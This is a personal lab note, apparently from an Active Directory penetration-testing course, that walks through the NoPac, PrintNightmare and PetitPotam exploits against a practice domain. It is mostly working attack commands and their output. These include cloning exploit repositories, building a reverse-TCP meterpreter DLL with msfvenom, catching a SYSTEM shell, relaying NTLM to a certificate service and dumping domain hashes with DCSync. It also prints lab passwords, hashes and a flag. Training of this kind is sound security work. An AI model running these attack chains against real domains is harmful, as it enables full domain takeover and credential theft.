# Bleeding Edge Vulnerabilities

All attacks come with a risk : For example, the PrintNightmare attack could potentially crash the print spooler service on a remote host and cause a service disruption.

## NoPac (SamAccountName Spoofing)

2021-42278 is a bypass vulnerability with the Security Account Manager (SAM).
2021-42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.

By default, authenticated users can add up to ten computers to a domain.

1) We change the name of the new host to match a Domain Controller's SamAccountName.
2) We request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name.
3) When a TGS is requested, it will issue the ticket with the closest matching name.
4) Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. 

0) Preparation

Ensuring Impacket is Installed
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install

Cloning the NoPac Exploit Repo
git clone https://github.com/Ridter/noPac.git

Scanning for NoPac
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663

--> vulnerable

Running NoPac & Getting a Shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>

Confirming the Location of Saved Tickets
ls
administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py

Using noPac to DCSync the Built-in Administrator Account
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...

### Windows Defender & SMBEXEC.py Considerations

If Windows Defender (or another AV or EDR product) is enabled on a target :

our shell session may be OK but issuing any commands will likely fail. 

Why ?
smbexec.py creates a service called BTOBTO
Any command we type is sent to the target over SMB inside a .bat file called execute.bat
With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system.

Windows Defender considers that behavior as malicious because of the creation and deletion of the tempory file.

--> smbexec.py is not quiet

## PrintNightmare

2 vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service

Cloning the Exploit
git clone https://github.com/cube0x0/CVE-2021-1675.git

Install cube0x0's Version of Impacket
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

Enumerating for MS-RPRN
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 

Generating a DLL Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes

sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

Configuring & Starting MSF multi/handler
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 

Running the Exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

Getting the SYSTEM Shell
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
C:\Windows\system32>whoami
whoami
nt authority\system

## PetitPotam (MS-EFSRPC)

Prerequisite : Active Directory Certificate Services (AD CS) is used into the domain

The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC).

Starting ntlmrelayx.py
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

In another window, we can run the tool PetitPotam.py.
python3 PetitPotam.py <attack host IP> <Domain Controller IP>

--> attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

Catching Base64 Encoded Certificate for DC01


Other solutions to run PetitPotam exploit :
Mimikatz
misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>
Powershell
Invoke-PetitPotam.ps1

Running PetitPotam.py
python3 PetitPotam.py <attack host IP> <Domain Controller IP>

Catching Base64 Encoded Certificate for DC01

[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIISt...CKBdGmY=
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed

Requesting a TGT Using gettgtpkinit.py
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIISt...CKBdGmY= dc01.ccache

Setting the KRB5CCNAME Environment Variable
export KRB5CCNAME=dc01.ccache

Using Domain Controller TGT to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f

klist

Confirming Admin Access to the Domain Controller
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

Submitting a TGS Request for Ourselves Using getnthash.py
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba

Using Domain Controller NTLM Hash to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba


Alternatively :

Requesting TGT and Performing PTT with DC01$ Machine Account
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

Confirming the Ticket is in Memory
klist

Performing DCSync with Mimikatz
cd .\mimikatz\x64\
.\mimikatz.exe
lsadump::dcsync /user:inlanefreight\krbtgt




## LAB

This tool is present on the ATTACK01 host in /opt/noPac.

ssh htb-student@$TARGET
HTB_@cademy_stdnt!

cd /opt/noPac

sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                            
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

C:\Windows\system32>type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
D0ntSl@ckonN0P@c!
